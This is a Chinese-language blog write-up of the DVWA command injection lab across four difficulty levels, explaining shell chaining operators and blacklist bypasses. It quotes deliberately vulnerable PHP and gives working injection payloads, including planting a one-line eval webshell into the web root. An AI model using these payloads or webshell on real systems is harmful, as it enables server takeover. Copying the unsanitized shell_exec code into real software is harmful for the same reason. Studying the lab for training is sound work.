---
layout: post
title: "DVWA Command Injection"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_CMD_Injection
author: ""
tags: ['DVWA', 'CMD_Injection']
---



# DVWA Command Injection

###### tags: `DVWA`

### 先了解cmd 的拼接技巧

<br/>
<br/>

* &&
cmd1 成功後執行 cmd2
cmd1 失敗後不執行 cmd2
```cmd=
echo 123 && whoami
```
<br/>
<br/>

* &
cmd1 不管失敗或成功都執行 cmd2

```cmd=
echo 123 & whoami

```
<br/>
<br/>

* ||
cmd1 成功後不執行 cmd2
cmd1 失敗後執行 cmd2

```cmd=
echo 123 || whoami
```
<br/>
<br/>



* |
cmd1 的 stdout 作為 cmd2 的輸入
```cmd=
dir | find ".txt"

netstat -ano | find "127.0.0.1"
```
<br/>
<br/>







# low

* code:
沒過濾輸入

```php=
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>

```
<br/><br/>



* 需要ping 一個 IP
可以執行成功
```
127.0.0.1 & echo 123
```
<br/><br/>



* 拿shell
找到 dvwa 目錄後，丟一句話木馬


```cmd=

寫一句話木馬
127.0.0.1 & echo "<?php @eval($_POST[x]); ?>" >> hack.php



發現cmd預設目錄在桌面，所以產生的 hack.php 也在桌面
127.0.0.1 & dir



cmd1 故意報錯因為 ping 太久了
11111 & dir



得到當前路徑
11111 & echo %cd%



找到 DVWA-master 目錄
11111 & dir | find "DVWA"


拼接 DVWA 完整路徑
C:\Users\xxx\Desktop\DVWA-master


copy 到dvwa 目錄
11111 & copy hack.php C:\Users\xxx\Desktop\DVWA-master


```

找出木馬的url 就可以用中國蟻劍連接。
<br/>
<br/>





編碼問題，有時 cmd 輸出的編碼環境跟 web 編碼不一樣會出現亂碼，可以試試看這招:

* cmd 輸入 chcp
我這裡顯示 active code page: 932

* 查詢 active code page: 932
 https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers

* 找到對應是 shift_jis


* 手動更改web編碼 或是安裝插件 charset之類的


<br/><br/>



# Medium 

* code:
* 過濾&&  和 ;

```php=
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

沒過慮到的拼接符，可以繼續使用。



&;&繞過:

```cmd=
&;&  
;被轉為空 所以又變成了&&
 

1111 &;& echo 123
會失敗，原因是 && 
cmd1 失敗後不執行 cmd2


改成
127.0.0.1 &;& echo 123
成功

```

<br/><br/>

# High

* 黑名單
```php=
    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',   ////這個關鍵
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

```


* 說明
一個字元的情況下，很難繞過，但如過是一個字元以上(字串)就有很高機會可以繞過

* | 管道符 
stdout 給下一個 cmd 當參數
```cmd=
只有|+ 空格 會轉空
127.0.0.1| echo 123
失敗


單寫 |
127.0.0.1|echo 123

成功  
注意:cmd1 也執行了，只是沒顯示出來，可以用wireshark 抓包看有沒有 ping 出來




空個 +|
127.0.01 |echo 123

成功  
注意:cmd1 也執行了，只是沒顯示出來，可以用wireshark 抓包看有沒有 ping 出來


```

但其實這道題是放水的。

<br/><br/>




# Impossible

* stripslashes   去掉/
* explode .號分隔成為一陣列

```php=
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target ); 
    
    //自己輸出一下
    var_dump($octet);
    exit();
    
```
<br/><br/>

* 數據放入陣列用並用逗號分開
*  127.0.0.1|echo 123
```
array(4) { [0]=> string(3) "127" [1]=> string(1) "0" [2]=> string(1) "0" [3]=> string(10) "1|echo 123" } 
```


在判斷每個數組是否都是整數，所以 [3] => "1|echo 123"  不是整數
```php=
// Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) 
```



繞不過。

<br/><br/><br/><br/>


